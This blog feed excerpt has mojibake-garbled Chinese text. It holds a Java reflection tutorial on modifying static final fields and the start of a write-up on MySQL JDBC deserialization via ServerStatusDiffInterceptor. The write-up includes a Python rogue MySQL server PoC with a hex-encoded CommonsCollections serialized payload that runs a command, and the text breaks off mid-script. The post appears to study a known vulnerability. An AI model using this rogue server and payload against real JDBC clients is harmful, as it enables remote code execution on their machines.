System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>è¿™ä¸¤ç§æ–¹æ³•æˆ‘ä»¬éƒ½å¯ä»¥é˜²æ­¢å…¶è¢«å¸¸é‡åŒ–</p><h2 id="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"><a href="#ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡" class="headerlink" title="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"></a>ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡</h2><p>æ­¤æ—¶é€šè¿‡å¸¸è§„åå°„çš„å†™æ³•å°±ä¼šæŠ¥é”™ï¼Œå¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹çš„è¯å°±éœ€è¦å…ˆå»é™¤finalä¿®é¥°ç¬¦æ‰è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//è·å–modifierså­—æ®µ</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å»é™¤finalä¿®é¥°ç¬¦</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å°†finalä¿®é¥°ç¬¦è®¾ç½®å›æ¥</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨modifierså­—æ®µå»é™¤finalä¿®é¥°ç¬¦å³å¯ä¿®æ”¹ã€‚</p><blockquote><p> <code>Field</code> ç±»ä¸­çš„ <code>modifiers</code> å­—æ®µã€‚è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ª <code>int</code> ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¯¥å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ <code>public</code>ã€<code>private</code>ã€<code>final</code> ç­‰ï¼‰ï¼Œè¯¥å­—æ®µæ˜¯ä¸€ä¸ªç§æœ‰å­—æ®µã€‚</p><p><code>Modifier.FINAL</code> æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œè¡¨ç¤º <code>final</code> ä¿®é¥°ç¬¦çš„ä½æ©ç ã€‚</p></blockquote><h1 id="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å…¶ä»–çš„åå°„ä¿®æ”¹éƒ½æ²¡æœ‰å˜åŒ–ï¼Œå°±æ˜¯ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡çš„æ–¹æ³•ä»Java12å¼€å§‹å¤±æ•ˆäº†ï¼Œæˆ‘åœ¨java17æµ‹è¯•æ˜¯ç›´æ¥æ²¡æœ‰modifiersè¿™ä¸ªå­—æ®µäº†ã€‚è¿™æ˜¯å› ä¸ºé«˜ç‰ˆæœ¬ä¸‹ä¸èƒ½é€šè¿‡getDeclaredFiledè·å–Fieldçš„å±æ€§ã€‚</p><p>è¿™ä¸€ç‚¹å¯ä»¥ä»fieldFilterMapé‡Œé¢çŸ¥é“</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>å›¾ä¸­è¢«è¿‡æ»¤çš„ç±»éƒ½ä¸èƒ½ç›´æ¥é€šè¿‡å…¬å…±åå°„è·å–ä»–ä»¬çš„å±æ€§äº†ï¼Œæˆ‘ä»¬çš„Fieldç±»å°±åœ¨å…¶ä¸­ã€‚</p><p>é‚£å°±éœ€è¦æ”¹ä¸€æ”¹æ–¹æ³•äº†ï¼Œè¿™ç§æ–¹æ³•å¯¹java8-java17éƒ½æ˜¯é€‚ç”¨çš„ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>æˆ‘ä»¬å¯ä»¥æ”¹æˆç”¨<strong>getDeclaredFields0</strong>æ–¹æ³•æ¥è·å–ï¼Œä»æ–‡ç« ä¸­å¯ä»¥çŸ¥é“ä»–èƒ½è¿”å›ä¸€ä¸ªFieldæ•°ç»„å¯¹è±¡ï¼Œé‡Œé¢å°±åŒ…å«äº†æˆ‘ä»¬çš„modifierså±æ€§</p><p>é‚£æˆ‘ä»¬çš„ä¿®æ”¹ä»£ç å°±å¯ä»¥æ”¹æˆä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//é«˜ç‰ˆæœ¬åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œçš„æ—¶å€™è¿˜éœ€è¦æ·»åŠ æ¨¡å—ï¼Œå› ä¸ºjava12çš„é«˜ç‰ˆæœ¬æ˜¯æ¨¡å—åŒ–çš„ï¼Œåœ¨vm-optionsæ·»åŠ ä¿®æ”¹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot;&gt;&lt;a href=&quot;#ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot; class=&quot;headerlink&quot; title=&quot;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot;&gt;&lt;/a&gt;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&lt;/h1&gt;&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a hr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="åŸºç¡€" scheme="https://clowsman.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-JDBCååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-09-24T15:07:50.000Z</published>
    <updated>2024-10-15T12:48:26.759Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å­¦ä¸€ä¸‹å¸¸è§çš„JDBCååºåˆ—åŒ–ï¼Œæ˜¯MYSQLçš„ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><h1 id="jdbcç®€å•ä»‹ç»"><a href="#JDBCç®€å•ä»‹ç»" class="headerlink" title="JDBCç®€å•ä»‹ç»"></a>JDBCç®€å•ä»‹ç»</h1><p>ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//åŠ è½½é©±åŠ¨</span><br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        <span class="hljs-comment">//å»ºç«‹è¿æ¥,å¯èƒ½è¦è®¾ç½®ä¸€ä¸‹æ—¶åŒºï¼Œå¯ä»¥è®¾ç½®ä¸ºä¸Šæµ·</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>);<br>        <span class="hljs-comment">//æ“ä½œæ•°æ®åº“æ‰§è¡Œå¢åˆ æ”¹æŸ¥</span><br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(<span class="hljs-string">&quot;select * from ceshi&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>è‹¥æ”»å‡»è€…èƒ½æ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œåˆ™å¯ä»¥é€šè¿‡è®¾ç½®å…¶é…ç½®æŒ‡å‘æ¶æ„MySQLæœåŠ¡å™¨è§¦å‘ObjectInputStream.readObject()ï¼Œæ„é€ ååºåˆ—åŒ–åˆ©ç”¨é“¾ä»è€Œé€ æˆRCEã€‚<br>é€šè¿‡JDBCè¿æ¥MySQLæœåŠ¡ç«¯æ—¶ï¼Œä¼šæœ‰å‡ å¥å†…ç½®çš„æŸ¥è¯¢è¯­å¥éœ€æ‰§è¡Œï¼Œå…¶ä¸­ä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœé›†åœ¨MySQLå®¢æˆ·ç«¯è¿›è¡Œå¤„ç†æ—¶ä¼šè¢«ObjectInputStream.readObject()è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è®¾ç½®å…¶é…ç½®æŒ‡å‘æ¶æ„MySQLæœåŠ¡è§¦å‘MySQL JDBCå®¢æˆ·ç«¯çš„ååºåˆ—åŒ–æ¼æ´ã€‚<br>å¯è¢«åˆ©ç”¨çš„ä¸¤æ¡æŸ¥è¯¢è¯­å¥ï¼š</p><ul><li><p>SHOW SESSION STATUS</p><p>æ­¤è¯­å¥ç”¨äºæ˜¾ç¤ºå½“å‰ä¼šè¯çš„çŠ¶æ€ä¿¡æ¯ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—å…³äºä¼šè¯çº§åˆ«çš„ç»Ÿè®¡ä¿¡æ¯å’Œå˜é‡çš„å€¼ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©å¼€å‘è€…å’Œæ•°æ®åº“ç®¡ç†å‘˜äº†è§£å½“å‰ä¼šè¯çš„æ€§èƒ½å’Œè¡Œä¸ºã€‚</p></li><li><p>SHOW COLLATION</p><p>æ­¤è¯­å¥ç”¨äºæ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­å¯ç”¨çš„å­—ç¬¦é›†å’Œæ’åºè§„åˆ™ï¼ˆcollationï¼‰ã€‚æ’åºè§„åˆ™å®šä¹‰äº†å¦‚ä½•æ¯”è¾ƒå’Œæ’åºå­—ç¬¦ä¸²ã€‚</p></li></ul><h1 id="serverstatusdiffinterceptoråˆ©ç”¨é“¾"><a href="#ServerStatusDiffInterceptoråˆ©ç”¨é“¾" class="headerlink" title="ServerStatusDiffInterceptoråˆ©ç”¨é“¾"></a>ServerStatusDiffInterceptoråˆ©ç”¨é“¾</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD</a></p><p>è¿™é‡Œçš„ç¯å¢ƒå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ccæ˜¯ä¸ºäº†ç”¨æ¥è§¦å‘ååºåˆ—åŒ–çš„</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>é¦–å…ˆæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯æ‰¾åŒ…å†…æœ‰å“ªä¸ªç±»çš„æ–¹æ³•é‡Œé¢æœ‰readObjectå‡½æ•°ï¼Œé“¾å­çš„ä½œè€…åœ¨æŒ–æ˜çš„æ—¶å€™å°±æ‰¾åˆ°äº†è¿™ä¸ªå…¥å£ç‚¹<strong>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</strong></p><p><img src="https://cdn.clown2024.cn/202410011740099.png" alt="image-20241001173957942"></p><p>è¿™é‡Œå°±å­˜åœ¨readObjectæ–¹æ³•ï¼Œé‚£å°±éœ€è¦åƒæ­£å¸¸æ‰¾é“¾å­ä¸€æ ·å¾€ä¸Šæ‰¾äº†</p><blockquote><p>è¿™é‡Œåªè¦æˆ‘ä»¬åœ¨jdbc urlä¸­è®¾ç½®autoDeserializeä¸ºtrueå°±å¯ä»¥è¿›å…¥åˆ°readObjecté‡Œé¢</p><p>-84å’Œ-19æ˜¯åºåˆ—åŒ–å¯¹è±¡çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è¯†æ•°æ®æ˜¯å¦ä¸ºåºåˆ—åŒ–å¯¹è±¡</p></blockquote><p><img src="https://cdn.clown2024.cn/202410012303198.png" alt="image-20241001230233251"></p><p>è¿™é‡Œå¯ä»¥æ‰¾åˆ°ResultSetUtilè¿™ä¸ªç±»çš„resultSetToMap</p><p>ç„¶åå†ç»§ç»­å¾€ä¸Šæ‰¾</p><p><img src="https://cdn.clown2024.cn/202410012304030.png" alt="image-20241001230435900"></p><p>æœ€ç»ˆå°±æ‰¾åˆ°äº†æˆ‘ä»¬çš„<strong>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</strong>æ–¹æ³•ï¼Œè¿™é‡Œæ‰§è¡Œäº†æˆ‘ä»¬çš„å‰é¢æåˆ°è¿‡çš„<strong>SHOW SESSION STATUS</strong>è¯­å¥ï¼Œç„¶åå°†è¿”å›çš„ç»“æœä¼ å…¥resultSetToMapæ–¹æ³•æ¥è°ƒç”¨</p><p>è¯¥ç±»æ˜¯ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œåœ¨JDBC URLä¸­è®¾å®šå±æ€§queryInterceptorsä¸º<code>ServerStatusDiffInterceptor</code>æ—¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢è¯­å¥ä¼šè°ƒç”¨æ‹¦æˆªå™¨çš„preProcesså’ŒpostProcessæ–¹æ³•ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢éƒ½è°ƒç”¨äº†populateMapWithSessionStatusValuesæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410012317524.png" alt="image-20241001231725481"></p><p>è¿™æ ·å°±æ„æˆäº†æˆ‘ä»¬çš„è§¦å‘æ¡ä»¶äº†</p><p>é‚£æˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œè¦è®©<strong>SHOW SESSION STATUS</strong>è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œæˆ‘ä»¬å°±éœ€è¦æ ¹æ®MySqlåè®®çš„æµé‡æ ¼å¼å»å†™ä¸€ä¸ªæ¶æ„çš„MySqlæœåŠ¡å™¨è®©å®¢æˆ·ç«¯è¿æ¥</p><p>æˆ‘ä»¬å¯ä»¥èµ·ä¸€ä¸ªmysqlçš„docekrå®¹å™¨ç„¶åå»æŠ“ä¸€ä¸‹æµé‡æ¥åˆ†æ</p><p><img src="https://cdn.clown2024.cn/202410012324338.png" alt="image-20241001232453239"></p><p>å°±ç”¨å‰é¢ç®€å•çš„ä¾‹å­æ‰§è¡Œä¸€ä¸‹æŠ“ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œå¦‚ä¸Šå›¾</p><blockquote><p>æŠ“æœ¬åœ°å›ç¯åŒ…éœ€è¦ä¸‹è½½npcapæ‰è¡Œ</p></blockquote><p>æ¯”å¦‚Response OK</p><p><img src="https://cdn.clown2024.cn/202410012329473.png" alt="image-20241001232901372"></p><p>æˆ‘ä»¬åªéœ€è¦è¿”å›è¿™äº›æ•°æ®å³å¯</p><p>æˆ‘ä»¬çš„æ”»å‡»è¿‡ç¨‹å°±æ˜¯ç…§æŠ„æµé‡åŒ…ï¼ŒæŒ‰ç…§è¿”å›çš„é¡ºåºè¿”å›ç»™å®¢æˆ·ç«¯å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€æ¡SHOW SESSION STATUSçš„æŸ¥è¯¢è·Ÿç€ä¼ªé€ ä¸€ä¸‹</p><p>ç„¶åcopyä¸€ä¸‹æ–‡ç« æœ‰å…³ç»“æœé›†æ•°æ®åŒ…çš„ç»“æ„</p><p><img src="https://cdn.clown2024.cn/202410012333975.png" alt="image-20241001233303908"></p><ul><li>æ•°æ®æ®µ1ï¼šè¯´æ˜ä¸‹é¢çš„ç»“æœé›†æœ‰å¤šå°‘åˆ—</li><li>æ•°æ®æ®µ2ï¼šåˆ—çš„å®šä¹‰</li><li>æ•°æ®æ®µ3ï¼š EOF åŒ…</li><li>æ•°æ®æ®µ4ï¼šè¡Œæ•°æ®ã€‚</li></ul><h2 id="expç¼–å†™"><a href="#expç¼–å†™" class="headerlink" title="expç¼–å†™"></a>expç¼–å†™</h2><p>è¿™é‡Œå°±ç›´æ¥copyå¸ˆå‚…çš„pocäº†ï¼Œè¯»ä¸€è¯»ä»£ç å­¦ä¹ ä¸€ä¸‹</p><p>æ¶æ„mysqlæœåŠ¡</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#é—®å€™æ¶ˆæ¯</span><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="hljs-comment">#å“åº”æ¶ˆæ¯</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn,data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment">#fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™  java -jar ysoserial [common7é‚£ä¸ª]  &quot;calc&quot; &gt; a</span><br>    file= <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span 